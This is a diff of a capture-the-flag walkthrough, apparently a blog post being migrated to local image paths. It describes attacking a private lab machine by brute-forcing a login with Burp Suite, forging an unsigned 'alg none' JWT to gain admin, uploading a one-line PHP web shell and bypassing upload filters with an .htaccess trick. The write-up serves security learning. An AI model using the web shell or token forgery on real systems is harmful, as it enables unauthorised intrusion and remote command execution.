@@ -86,7 +86,7 @@ echo "NzQyMjE=" | base64 -d
 
 Visiting `http://192.168.56.136/74221` reveals a login page.
 
-[![](https://nutzh.top/wp-content/uploads/2025/04/Screenshot-2025-04-23-211732-edited.png)](https://nutzh.top/wp-content/uploads/2025/04/Screenshot-2025-04-23-211732.png)Instead of using the full `rockyou.txt`, I used a smaller list of common credentials from a CTF wordlist. With Burp Suite, I successfully brute-forced the login.  
+[![](/mdx_images/2025/04/Screenshot-2025-04-23-211732-edited.png)](/mdx_images/2025/04/Screenshot-2025-04-23-211732.png)Instead of using the full `rockyou.txt`, I used a smaller list of common credentials from a CTF wordlist. With Burp Suite, I successfully brute-forced the login.  
 so here is a small one
 
 ```text
@@ -140,7 +140,7 @@ andrew
 
 using burpsuite for that Job and it works :
 
-[![](https://nutzh.top/wp-content/uploads/2025/04/Screenshot-2025-04-23-212957-1024x483.png)](https://nutzh.top/wp-content/uploads/2025/04/Screenshot-2025-04-23-212957.png)**Successful Credentials:** `test:123456`
+[![](/mdx_images/2025/04/Screenshot-2025-04-23-212957-1024x483.png)](/mdx_images/2025/04/Screenshot-2025-04-23-212957.png)**Successful Credentials:** `test:123456`
 
 After logging in, I noticed the session cookie is a JWT. Using [FusionAuth’s JWT Decoder](https://fusionauth.io/dev-tools/jwt-decoder), I decoded the token.
 
@@ -162,7 +162,7 @@ After logging in, I noticed the session cookie is a JWT. Using [FusionAuth’s J
 ```text
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjMiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3NDU0NDQ3MDB9.
 ```
-[![](https://nutzh.top/wp-content/uploads/2025/04/Screenshot-2025-04-23-214559.png)](https://nutzh.top/wp-content/uploads/2025/04/Screenshot-2025-04-23-214559.png)Pasting this token into the browser’s cookie grants us admin access. (refresh after parsing the token)
+[![](/mdx_images/2025/04/Screenshot-2025-04-23-214559.png)](/mdx_images/2025/04/Screenshot-2025-04-23-214559.png)Pasting this token into the browser’s cookie grants us admin access. (refresh after parsing the token)
 
 ### File Upload
 
@@ -171,7 +171,7 @@ As admin, we gain access to a file upload feature. so we gonna create a simple p
 ```php
 <?php system($_REQUEST['cmd']); ?>
 ```
-[![](https://nutzh.top/wp-content/uploads/2025/04/Screenshot-2025-04-23-225719-1.png)](https://nutzh.top/wp-content/uploads/2025/04/Screenshot-2025-04-23-225719-1.png)Only .jpg and .png files are allowed!
+[![](/mdx_images/2025/04/Screenshot-2025-04-23-225719-1.png)](/mdx_images/2025/04/Screenshot-2025-04-23-225719-1.png)Only .jpg and .png files are allowed!
 
 so i tried some tricks , after i successed to bypass this restriction using an `.htaccess` trick. For more details, check PortSwigger’s article on [file upload attacks](https://portswigger.net/web-security/file-upload).
 
